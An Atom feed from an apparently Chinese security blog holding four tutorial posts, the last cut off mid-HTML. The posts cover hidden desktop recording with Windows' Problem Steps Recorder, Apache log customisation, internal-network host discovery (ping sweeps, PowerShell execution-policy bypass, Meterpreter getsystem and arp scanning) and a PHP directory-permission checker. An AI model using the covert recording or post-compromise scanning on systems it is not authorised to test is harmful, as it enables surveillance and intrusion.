<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RcoIl的窝</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://rcoil.me/"/>
  <updated>2017-09-08T12:01:09.844Z</updated>
  <id>http://rcoil.me/</id>
  
  <author>
    <name>RcoIl</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>巧妙利用win自带的 PSR 实现监控Windows桌面</title>
    <link href="http://rcoil.me/2017/09/%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8win%E8%87%AA%E5%B8%A6%E7%9A%84-PSR-%E5%AE%9E%E7%8E%B0%E7%9B%91%E6%8E%A7Windows%E6%A1%8C%E9%9D%A2/"/>
    <id>http://rcoil.me/2017/09/巧妙利用win自带的-PSR-实现监控Windows桌面/</id>
    <published>2017-09-08T09:16:33.000Z</published>
    <updated>2017-09-08T12:01:09.844Z</updated>
    
    <content type="html"><![CDATA[<p>PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。<br><a id="more"></a></p>
<hr>
<p>唯一的限制：要求系统是windows 7之后，也就是在做个人机的时候可以使用，不排除个别的情况。之前不知道有命令行的方法，直到看了三好学生的paper（这段时间一直在啃）。</p>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p>直接查看进阶只用方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">psr.exe [/start |/stop][/output &lt;fullfilepath&gt;] [/sc (0|1)] [/maxsc &lt;value&gt;]</div><div class="line">[/sketch (0|1)] [/slides (0|1)] [/gui (0|1)]</div><div class="line">[/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)]</div><div class="line">[/stopevent &lt;eventname&gt;] [/maxlogsize &lt;value&gt;] [/recordpid &lt;pid&gt;]</div><div class="line"></div><div class="line">/start 开始录制，需要指定文件保存路径</div><div class="line">/stop 停止录制 </div><div class="line">/sc 捕捉记录步骤的截图，0|1</div><div class="line">/maxsc 最大的截图数量</div><div class="line">/maxlogsize 最大日志文件大小(MB)</div><div class="line">/gui 是否显示psr的界面，0|1 </div><div class="line">/arcetl Include raw ETW file in archive output.</div><div class="line">/arcxml Include MHT file in archive output.</div><div class="line">/recordpid Record all actions associated with given PID.</div><div class="line">/sketch Sketch UI if no screenshot was saved.</div><div class="line">/slides Create slide show HTML pages.</div><div class="line">/output 保存的输出路径</div><div class="line">/stopevent Event to signal after output files are generated.</div></pre></td></tr></table></figure></p>
<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">psr.exe /start /gui 0 /output C:\windows\temp\capture.zip</div><div class="line">	后台启动psr并开始录制，文件保存为C:\windows\temp\capture.zip</div><div class="line">Start-Sleep -s 10;</div><div class="line">	等待10s，即录制时间为10s</div><div class="line">psr.exe /stop;</div><div class="line">	结束录制，自动退出</div></pre></td></tr></table></figure></p>
<p>压缩包内是mht格式,直接用IE打开就好。效果为：<br><img src="/image/PSR.PNG" alt=""></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><img src="/image/Turn off Problem Steps Recorder.PNG" alt="Turn off Problem Steps Recorder"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，bat+定时任务，一定会用上它。</p>
<p>【参考】<br><a href="http://cb.drops.wiki/drops/tips-13125.html" target="_blank" rel="external">渗透技巧——如何巧妙利用PSR监控Windows桌面</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="http://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透技巧" scheme="http://rcoil.me/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>apache2日志定制</title>
    <link href="http://rcoil.me/2017/09/apache2%E6%97%A5%E5%BF%97%E5%AE%9A%E5%88%B6/"/>
    <id>http://rcoil.me/2017/09/apache2日志定制/</id>
    <published>2017-09-02T04:52:59.000Z</published>
    <updated>2017-09-02T11:52:02.330Z</updated>
    
    <content type="html"><![CDATA[<p>由于工作需要，需要对访问记录进行过滤，所以需要对日志生成的格式进行定制化。<br><a id="more"></a></p>
<h2 id="认识日志格式"><a href="#认识日志格式" class="headerlink" title="认识日志格式"></a>认识日志格式</h2><p>制日志文件的格式涉及到两个指令，即LogFormat指令和CustomLog指令，默认httpd.conf文件提供了关于这两个指令的几个示例。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</div><div class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common</div></pre></td></tr></table></figure></p>
<p>科普一下。</p>
<ul>
<li>通用日志格式(Common Log Format)<br>这是一个典型的记录格式：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common</div><div class="line">CustomLog logs/access_log common</div></pre></td></tr></table></figure>
</li>
</ul>
<p>它定义了一种特定的记录格式字符串，并给它起了个别名叫<code>common</code> ，其中的<code>%</code>指示服务器用某种信息替换，其他字符则不作替换。引号(“)必须加反斜杠转义，以避免被解释为字符串的结束。格式字符串还可以包含特殊的控制符，如换行符<code>\n</code> 、制表符<code>\t</code>。<br><code>CustomLog</code>指令建立一个使用指定别名的新日志文件，除非其文件名是以斜杠开头的绝对路径，否则其路径就是相对于ServerRoot的相对路径。</p>
<p>上述配置是一种被称为通用日志格式(CLF)的记录格式，它被许多不同的Web服务器所采用，并被许多日志分析程序所识别，它产生的记录形如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1 - - [30/Aug/2017:10:01:57 +0800] &quot;GET /phpinfo.php HTTP/1.1&quot; 200 58518</div></pre></td></tr></table></figure></p>
<p>部分说明如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">127.0.0.1 (%h) #发送请求到服务器的客户的IP地址</div><div class="line">- (%l) #由客户端identd进程判断的RFC1413身份(identity)，输出中的符号&quot;-&quot;表示此处的信息无效。(不推荐使用)</div><div class="line">- (%u) #HTTP认证系统得到的访问该网页的客户标识(userid)，环境变量REMOTE_USER会被设为该值并提供给CGI脚本（一般为无意义项）</div><div class="line">[30/Aug/2017:10:01:57 +0800] (%t) #服务器完成请求处理时的时间 [日/月/年:时:分:秒 时区]</div><div class="line">\&quot;%r\&quot; #客户端发出的包含许多有用信息的请求行</div><div class="line">200 (%&gt;s) #服务器返回给客户端的状态码</div><div class="line">58518 (%b) #不包括相应头的字节数，如果想要设置记录为0，则设置为%B</div></pre></td></tr></table></figure></p>
<ul>
<li>组合日志格式(Combined Log Format) </li>
</ul>
<p>另一种常用的记录格式是组合日志格式，形式如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-agent&#125;i\&quot;&quot; combined</div><div class="line">CustomLog log/access_log combined</div></pre></td></tr></table></figure></p>
<p>这种格式与通用日志格式类似，但是多了两个 <code>\&quot;%{header}i\&quot;</code> 项，其中的<code>header</code>可以是任何请求头。这种格式的记录形如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.2.101 - - [31/Aug/2017:14:32:39 +1200] &quot;GET /demo.php?dir=C%3A\\phpStudy\\WWW\\&amp;Submit=%E6%A3%80%E6%B5%8B HTTP/1.1&quot; 200 70971 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</div></pre></td></tr></table></figure></p>
<p>其中，多出来的项是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(\&quot;%&#123;Referer&#125;i\&quot;) #因为我这里是本地做的测试，所以Referer信息没有显示。此项指明了该请求是被从哪个网页提交过来的，这个网页应该包含有/demo.php或者其连接。 </div><div class="line">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot; (\&quot;%&#123;User-agent&#125;i\&quot;) #&quot;User-Agent&quot;请求头。此项是客户端提供的浏览器识别信息。</div></pre></td></tr></table></figure></p>
<h2 id="定制日志格式"><a href="#定制日志格式" class="headerlink" title="定制日志格式"></a>定制日志格式</h2><p>首先从命令开始<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">可以简单地在配置文件中用多个CustomLog指令来建立多文件访问日志</div><div class="line">CustomLog log/demo/demo.log demo #文件夹提前建立</div></pre></td></tr></table></figure></p>
<p>一般获取得信息只需要是远程访问主机IP(%h)，访问时间(%t)，请求行，状态码(%&gt;s)，浏览器信息(\”%{User-agent}i\”)<br>而特殊的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">只是记录404的状态，</div><div class="line">	LogFormat %404&#123;Referer&#125;i BrokenLinks</div><div class="line"></div><div class="line">使用env</div><div class="line">	SetEnvIfNoCase 当满足某个条件时，为变量赋值，一般结合其他指令使用。如：</div><div class="line">	1。SetEnvIf Request_URI &quot;/logo(.)+&quot; local_ref=0</div><div class="line">		Allow from env=local_ref  当local_ref有值时，可以访问。</div><div class="line">	2。SetEnvIfNoCase Request_URI .js$ useless-file</div><div class="line">		CustomLog logs/demo/demo.log demo env=!useless-file</div><div class="line">	当满足条件时才记录日志。</div><div class="line"></div><div class="line">使用rotatelogs进行分隔</div><div class="line">	CustomLog &quot;|bin/rotatelogs.exe -l logs/demo/demo_%Y%m%d.log 86400&quot; demo</div><div class="line">	个人再windows下使用rotatelogs.exe会跳出一个窗口</div></pre></td></tr></table></figure></p>
<p>弄了下，没看到想要的效果，有时间再更新下</p>
<h2 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h2><p>弄到最后，就想着用python直接提取需要的数据行就行。<br>demo：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding: UTF-8 -*- </span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readlog</span><span class="params">(keywords,outputfile,logpath)</span>:</span></div><div class="line">    file = open(logpath,<span class="string">"r"</span>)</div><div class="line">    filename = open(outputfile,<span class="string">"a"</span>)</div><div class="line">    <span class="keyword">for</span> dirr <span class="keyword">in</span> file:</div><div class="line">        <span class="keyword">if</span> keywords <span class="keyword">in</span> dirr:</div><div class="line">            filename.write(dirr+<span class="string">"\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span>:</div><div class="line">        print(<span class="string">'Usage:\n\t%s keywords outputfile logpath'</span> % sys.argv[<span class="number">0</span>])</div><div class="line">    <span class="keyword">else</span>:    </div><div class="line">        keywords = sys.argv[<span class="number">1</span>].strip()</div><div class="line">        outputfile = sys.argv[<span class="number">2</span>].strip()</div><div class="line">        logpath = sys.argv[<span class="number">3</span>].strip()</div><div class="line">        readlog(keywords,outputfile,logpath)</div></pre></td></tr></table></figure></p>
<p>当然，筛选的方法多种多样。</p>
<p>参考：<br><a href="http://www.zzbaike.com/wiki/Apache%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6" target="_blank" rel="external">Apache的日志文件</a><br><a href="http://blog.csdn.net/guoguo1980/article/details/2244133" target="_blank" rel="external">Apache日志配置</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于工作需要，需要对访问记录进行过滤，所以需要对日志生成的格式进行定制化。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://rcoil.me/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内网存活扫描</title>
    <link href="http://rcoil.me/2017/08/%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F/"/>
    <id>http://rcoil.me/2017/08/内网存活扫描/</id>
    <published>2017-08-05T07:18:43.000Z</published>
    <updated>2017-09-08T11:52:51.140Z</updated>
    
    <content type="html"><![CDATA[<p>咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。<br><a id="more"></a></p>
<h2 id="icmp扫描"><a href="#icmp扫描" class="headerlink" title="icmp扫描"></a>icmp扫描</h2><p>基于icmp的各种内网主机发现方式，如果防火墙过滤的icmp请求，这种方式基本就废了，但是基本上都不会过滤icmp协议的请求。除了本身自带的命令，也可以考虑使用第三方程序，比如<code>cping</code>。</p>
<h3 id="在win下使用icmp扫描"><a href="#在win下使用icmp扫描" class="headerlink" title="在win下使用icmp扫描"></a>在win下使用icmp扫描</h3><ul>
<li><p>cmd中执行如下命令，对整个C段进行ping扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>B 段查找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Pinging&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>另外<code>findstr /i “pinging”</code>或<code>findstr /i “ping”</code> 可以换成<code>findstr “[”</code> 的 可以适合多语言环境</p>
<ul>
<li>利用powershell对目标内网进行icmp扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot;  </div><div class="line"></div><div class="line">目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.3.1 - 192.168.31.254`</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="在linux下使用各类icmp扫描"><a href="#在linux下使用各类icmp扫描" class="headerlink" title="在linux下使用各类icmp扫描"></a>在linux下使用各类icmp扫描</h3><ul>
<li><p>最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> 192.168.1.&#123;1..254&#125; </div><div class="line"><span class="keyword">do</span> </div><div class="line">	ping <span class="variable">$ip</span> -c 1 &amp;&gt; /dev/null </div><div class="line">		<span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span> </div><div class="line">			<span class="built_in">echo</span> <span class="variable">$ip</span> is alive .... </div><div class="line">		<span class="keyword">fi</span> </div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
</li>
<li><p>nmap的icmp扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sn -PE 192.168.1.0/24</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="arp扫描"><a href="#arp扫描" class="headerlink" title="arp扫描"></a>arp扫描</h2><h3 id="在win下使用各种arp扫描"><a href="#在win下使用各种arp扫描" class="headerlink" title="在win下使用各种arp扫描"></a>在win下使用各种arp扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">start /b arpscan.exe -t 192.168.1.0/24 &gt;&gt; result.txt</div><div class="line"></div><div class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;  &gt;&gt; result.txt</div></pre></td></tr></table></figure>
<h3 id="在-linux-下使用-arp-扫描"><a href="#在-linux-下使用-arp-扫描" class="headerlink" title="在 linux 下使用 arp 扫描"></a>在 linux 下使用 arp 扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># wget https://nmap.org/dist/nmap-7.40.tar.bz2</div><div class="line"># bzip2 -cd nmap-7.40.tar.bz2 | tar xvf -</div><div class="line"># cd nmap-7.40 </div><div class="line"># ./configure  这里可以用--prefix指定安装路径</div><div class="line"># echo $?</div><div class="line"># make</div><div class="line"># make install</div><div class="line"># echo $?</div><div class="line"># make install</div><div class="line"># echo $?	</div><div class="line"># nmap -sn -PR 192.168.1.0/24  尝试arp扫描</div></pre></td></tr></table></figure>
<ul>
<li><p>处在别人的vpn内网(kali)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">netdiscover -r 192.168.1.0/24 -i eth0</div><div class="line"></div><div class="line">msf的arp扫描模块</div><div class="line"></div><div class="line">msf &gt; use  auxiliary/scanner/discovery/arp_sweep</div><div class="line">msf &gt; show options</div><div class="line">msf &gt; set  interface eth0</div><div class="line">msf &gt; set  smac 00:0c:29:92:fd:85</div><div class="line">msf &gt; set  rhosts 192.168.1.0/24</div><div class="line">msf &gt; set  threads 20</div><div class="line">msf &gt; set  shost 192.168.1.27</div><div class="line">msf &gt; run</div></pre></td></tr></table></figure>
</li>
<li><p>meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; getsystem 	另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题</div><div class="line">meterpreter &gt; run autoroute -s 192.168.1.0/24</div><div class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="基于smb和netbios的内网主机发现方式"><a href="#基于smb和netbios的内网主机发现方式" class="headerlink" title="基于smb和netbios的内网主机发现方式"></a>基于smb和netbios的内网主机发现方式</h2><h3 id="win下"><a href="#win下" class="headerlink" title="win下:"></a>win下:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nbtscan.exe -m  192.168.1.0/24   非常经典的小工具</div></pre></td></tr></table></figure>
<p>linux下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz</div><div class="line">tar -zxvf nbtscan-source-1.0.35.tgz</div><div class="line">make</div><div class="line">echo $?</div><div class="line">./nbtscan -h</div><div class="line">./nbtscan -m 192.168.1.0/24</div></pre></td></tr></table></figure></p>
<h2 id="域内扫描"><a href="#域内扫描" class="headerlink" title="域内扫描"></a>域内扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net view</div><div class="line">dsquery computer  其实,域内最好用的也就是nbtscan了</div></pre></td></tr></table></figure>
<p>Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@echo off</div><div class="line">setlocal ENABLEDELAYEDEXPANSION</div><div class="line">@FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (</div><div class="line">@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (</div><div class="line">@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k  %%j)</div><div class="line">)</div><div class="line">)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="http://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="系统安全,内网" scheme="http://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>PHP可读可写操作</title>
    <link href="http://rcoil.me/2017/07/PHP%E5%8F%AF%E8%AF%BB%E5%8F%AF%E5%86%99%E6%93%8D%E4%BD%9C/"/>
    <id>http://rcoil.me/2017/07/PHP可读可写操作/</id>
    <published>2017-07-12T04:28:58.000Z</published>
    <updated>2017-08-03T15:29:50.345Z</updated>
    
    <content type="html"><![CDATA[<p>判断文件是否为可读可写。<br><a id="more"></a></p>
<h2 id="is-dir-函数"><a href="#is-dir-函数" class="headerlink" title="is_dir()函数"></a>is_dir()函数</h2><p>属于Filesystem 函数,允许您访问和操作文件系统.is_dir()函数检查指定的文件是否是目录。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">is_dir(file)</div></pre></td></tr></table></figure>
<p><code>file</code>为必选项，填写规定要检测的文件。如果 file 是一个相对路径，则按照当前工作目录检查其相对路径。<br>注: 本函数的结果会被缓存。</p>
<h2 id="opendir-函数"><a href="#opendir-函数" class="headerlink" title="opendir() 函数"></a>opendir() 函数</h2><p>属于<code>Directory 函数</code>，<code>opendir() 函数</code>允许获得关于目录及其内容的信息。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opendir(path,context);</div></pre></td></tr></table></figure>
<p><code>path</code>为必选项，规定要打开的目录路径。<code>context</code>为可选项。</p>
<h2 id="readdir-函数"><a href="#readdir-函数" class="headerlink" title="readdir() 函数"></a>readdir() 函数</h2><p>属于<code>Directory 函数</code>，<code>readdir() 函数</code>返回目录中下一个文件的文件名。</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">readdir(dir_handle);</div></pre></td></tr></table></figure>
<p><code>dir_handle</code>为可选。当多个<code>opendir()</code>，则可指定之前由<code>opendir()</code> 打开的句柄资源。如果为指定，则使用最后一个由 <code>opendir()</code>打开的链接。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>打开一个目录，读取它的内容，然后关闭：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$dir = <span class="string">"D:\phpStudy\WWW"</span>;</div><div class="line"><span class="keyword">if</span> (is_dir($dir))&#123;  <span class="comment">//is_dir判断给定文件名是否是一个目录</span></div><div class="line">  <span class="keyword">if</span> ($dh = opendir($dir))&#123;  <span class="comment">// 打开目录</span></div><div class="line">    <span class="keyword">while</span> (($file = readdir($dh)) !== <span class="keyword">false</span>)&#123;  <span class="comment">//循环读取指定目录内容</span></div><div class="line">      <span class="keyword">echo</span> <span class="string">"filename:"</span> . $file . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">    closedir($dh);<span class="comment">//关闭</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>结果：<br><img src="https://ooo.0o0.ooo/2017/07/12/596617a0678c4.gif" alt=""></p>
<h2 id="is-writable-和is-readable"><a href="#is-writable-和is-readable" class="headerlink" title="is_writable()和is_readable()"></a>is_writable()和is_readable()</h2><p>属于<code>Filesystem 函数</code>,允许您访问和操作文件系统。<code>is_writable() 函数</code>判断指定的文件是否可写。<code>is_readable() 函数</code>判断指定文件名是否可读。</p>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">is_writable(file)</div><div class="line">is_readable(file)</div></pre></td></tr></table></figure>
<p><code>file</code>为必选项。规定要检查的文件。</p>
<h2 id="实际应用中可以这样"><a href="#实际应用中可以这样" class="headerlink" title="实际应用中可以这样"></a>实际应用中可以这样</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;form id=<span class="string">"form1"</span> name=<span class="string">"form1"</span> method=<span class="string">"get"</span> action=<span class="string">""</span>&gt;</div><div class="line">  &lt;label&gt;</div><div class="line">  &lt;div align=<span class="string">"center"</span>&gt;文件路径：</div><div class="line">    &lt;input name=<span class="string">"dir"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"自定义检测路径"</span> /&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> value=<span class="string">"检测"</span> /&gt;</div><div class="line">  &lt;/div&gt;</div><div class="line">  &lt;/label&gt;</div><div class="line">&lt;/form&gt;&lt;label&gt;</div><div class="line">&lt;div align="center"&gt;Author:&lt;span class="STYLE1"&gt;&lt;font color='red'&gt; 